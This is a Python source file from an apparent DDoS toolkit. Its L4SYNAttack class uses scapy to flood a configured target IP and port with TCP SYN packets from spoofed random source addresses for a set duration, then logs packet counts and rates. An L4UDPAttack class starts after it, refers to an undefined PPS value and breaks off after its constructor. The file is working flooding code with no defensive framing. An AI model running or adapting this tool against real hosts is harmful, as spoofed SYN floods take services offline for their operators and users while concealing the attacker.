import time, datetime
from pathlib import Path
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.volatile import RandIP, RandShort
from ddos.utils import load_json, save_jsonl

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l4ddos.json")
LOGS = Path(__file__).resolve().parents[2] / "logs/l4attack.jsonl"
TARGET_IP = ddos_config["l4"]["TARGET_IP"]
TARGET_PORT = ddos_config["l4"]["TARGET_PORT"]
DURATION = ddos_config["l4"]["DURATION"]


class L4SYNAttack:
    def __init__(self, pps: int | None = None):
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.duration = DURATION
        self.pps = pps
        self.stats = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "errors_count": 0
        }

    def attack(self):
        print("⏳ L4 SYN Attack is running...")
        start_time = time.time()
        stop_time = time.time() + self.duration
        while time.time() < stop_time:
            try:
                packet = IP(dst=self.target_ip, src=RandIP()) / \
                         TCP(dport=self.target_port, sport=RandShort(), flags="S")
                send(packet, verbose=0)
                self.stats["packets_sent"] += 1
                if self.pps:
                    time.sleep(1.0/self.pps)
            except Exception as e:
                self.stats["errors_count"] += 1
        print("✅ L4 SYN Attack finished.")
        self.attack_statistic_save(total_duration=time.time() - start_time)
        self.attack_statistic_clear()

    def attack_statistic_save(self, total_duration):
        if total_duration > 0:
            self.stats["pps_achieved"] = self.stats["packets_sent"] / total_duration
        logs = {
            f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S.%f}": {
                "---PARAMS---": {
                    "Pps lim": self.pps
                },
                "---STATS---": {
                    "Packets Sent": self.stats["packets_sent"],
                    "Pps": self.stats["pps_achieved"],
                    "Errors": self.stats["errors_count"]
                }
            }
        }
        save_jsonl(LOGS, logs, show=True)

    def attack_statistic_clear(self):
        self.stats = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "errors_count": 0
        }


class L4UDPAttack:
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.pps = PPS
        self.duration = DURATION
        self.stats = {
            "packets_sent": 0,
            "pps_achieved": 0,
            "bytes_send": 0,
            "errors_count": 0
        }